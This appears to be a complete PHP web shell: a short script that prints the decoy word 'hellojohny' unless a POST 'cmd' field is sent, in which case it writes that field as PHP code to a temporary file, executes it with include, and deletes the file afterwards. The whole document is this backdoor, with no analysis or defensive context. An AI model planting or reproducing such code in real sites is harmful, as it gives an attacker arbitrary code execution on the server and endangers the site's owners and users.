<?php

if(!isset($_POST['cmd'])) {
	echo "hellojohny";
	die();
}
$f = 'p453536.php';
$a = $_POST['cmd'];
file_put_contents($f,'<?php '.$a);
include($f);
@unlink($f);